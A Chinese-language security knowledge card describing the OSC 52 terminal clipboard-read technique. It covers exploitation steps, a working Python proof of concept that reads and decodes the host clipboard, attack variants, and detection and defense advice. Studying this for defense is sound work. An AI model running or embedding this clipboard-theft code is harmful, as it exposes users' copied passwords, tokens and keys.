---
id: defense-forensics-terminal-osc52-clipboard-read
title: OSC 52 剪贴板读取：在受害者终端内窃取宿主机剪贴板内容
type: scenario
domain: defense
path: defense/forensics
technique: osc52-clipboard-read
aliases:
- OSC 52 剪贴板窃取
- 终端读取剪贴板
- xterm OSC 52 查询
- 剪贴板凭证泄露
tags:
- terminal
- osc52
- clipboard
- credential-access
- data-exfiltration
- tty-raw
- xterm
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:36:16+08:00'
  notes: 已对照原文与图19/20核对：xterm 配置 disallowedWindowOps:none 后，clipboard_steal.py 切换 raw 模式发送 OSC 52 查询，图20 成功打印宿主机剪贴板内容；卡中依赖终端允许读取、程序在受害者前台 TTY 运行的边界准确。未涉及版本区间。PoC 未在本机执行。
---

## 一句话结论

支持 OSC 52 读取的终端会响应 `ESC ] 52 ; c ; ? BEL` 查询，把宿主机剪贴板内容以 Base64 写回 PTY；在受害者终端中运行的程序只要切到 raw 模式读取该响应，就能窃取用户复制过的密码、令牌或密钥。

## 原理

- OSC 52 用于让终端与剪贴板交互，写操作 `\e]52;c;<base64>\a` 被广泛支持（SSH 远程复制依赖它），部分终端还支持读操作 `\e]52;c;?\a`。
- 终端收到读查询后，把剪贴板内容 Base64 编码，以 `\e]52;c;<base64>\a`（或 ST 结尾）写回终端输入流。
- 程序把 stdin 设为 raw 模式后，可以绕过 Shell 行编辑直接读取这些原始字节，截取 OSC 52 响应并解码。
- 之所以是完整的数据窃取原语：剪贴板常被用户临时存放口令、API token、验证码、私钥；程序无需 root、无需读取浏览器数据库，即可拿到跨应用复制的敏感内容。

## 触发条件

- 终端支持并允许 OSC 52 读取（xterm 需放开窗口/剪贴板操作，如 `XTerm*disallowedWindowOps: none`；多数终端默认禁用读取，只允许写入）；
- 攻击者能在受害者终端中执行程序，或诱导受害者运行脚本/命令（恶意 CLI、npm/postinstall、`curl | bash`、被替换的运维工具等）；
- 程序在真实 TTY 前台运行，能切换 raw 模式并收到终端响应；
- 剪贴板中存有敏感内容。

## 利用步骤

1. 在受害者终端运行程序，保存并切换 stdin 为 raw 模式。
2. 向 stdout 写 `\x1b]52;c;?\x07`。
3. 在超时窗口内读取 stdin，定位 `]52;` 响应头，读到 BEL 或 `ESC \` 终止。
4. 取第二个分号后的 Base64 数据解码，得到剪贴板内容；随后恢复 TTY 设置，避免终端卡死。
5. 将内容写入文件或通过程序自身的网络通道外传。

## PoC

```python
import sys, os, tty, termios, select, base64

fd = sys.stdin.fileno()
old = termios.tcgetattr(fd)
try:
    tty.setraw(fd)
    os.write(sys.stdout.fileno(), b"\x1b]52;c;?\x07")
    resp = b""
    while select.select([fd], [], [], 2.0)[0]:
        ch = os.read(fd, 1)
        resp += ch
        if b"]52;" in resp and (ch == b"\x07" or resp.endswith(b"\x1b\\")):
            break
finally:
    termios.tcsetattr(fd, termios.TCSADRAIN, old)

start = resp.find(b";", resp.find(b";") + 1) + 1
end = resp.find(b"\x07", start)
if end == -1:
    end = resp.find(b"\x1b", start)
print(base64.b64decode(resp[start:end]).decode("utf-8", "replace"))
```

验证环境：`xterm -xrm 'XTerm*disallowedWindowOps: none' &`，先在宿主机复制测试字符串，再在 xterm 内运行脚本；无响应说明该终端的 OSC 52 读取被禁用。

## 变体与关联

- 变体：通过 SSH/tmux 转发把查询送到外层终端；结合剪贴板写入（`\e]52;c;<base64>\a`）篡改用户即将粘贴的内容；轮询读取以持续收集剪贴板变化。
- 关联：[[defense-forensics-terminal-title-query-stdin-rce]]（同属终端把响应写回输入流的信任问题）；[[defense-forensics-ansi-escape-log-poisoning]]（终端转义注入的显示欺骗面）。
- 影响边界：这是本地代码执行后的凭证收集手法，不是远程投递；若终端禁用 OSC 52 读取或程序不在前台 TTY，读取失败。剪贴板为空或内容非敏感时无收益。

## 检测与防御

- 检测：进程对 TTY 调用 `tcsetattr` 切 raw 后立即写入 OSC 52 查询；异常程序读取 stdin 控制序列；终端配置被改为允许剪贴板读取；进程短时间内访问剪贴板并外连。
- 防御：终端关闭 OSC 52 读取（仅保留写入或全部禁用），xterm 用 `disallowedWindowOps` 限制；不运行来源不明的 CLI/安装脚本；敏感操作后清空剪贴板；使用支持“剪贴板读取需确认”的终端；对运维工具做完整性校验。
